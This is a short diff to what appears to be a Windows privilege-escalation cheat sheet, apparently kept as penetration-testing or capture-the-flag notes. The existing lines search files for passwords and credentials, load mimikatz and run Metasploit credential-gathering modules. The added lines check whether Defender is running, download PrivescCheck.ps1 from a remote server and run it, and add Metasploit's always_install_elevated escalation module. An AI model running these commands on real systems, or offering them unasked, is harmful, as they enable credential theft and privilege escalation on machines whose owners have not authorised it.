@@ -188,6 +188,11 @@ netstat -ano
 findstr /si password *.txt # .xml .ini
 findstr /spin "password" *.*
 dir /s *pass* == *cred* == *vnc* == *config*
+
+Get-MpComputerStatus #check if any protection, like antivirus or Windows Defender, is up and running
+
+curl http://myserver/PrivescCheck.ps1 -o check.ps1
+. .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended
 ```
 
 PowerView.ps1
@@ -205,6 +210,7 @@ getprivs
 load kiwi #download mimikatz
 run post/windows/gather/enum_applications
 run post/multi/gather/firefox_creds
+use windows/local/always_install_elevated
 ```
 
 view all of the hidden files in the current directory
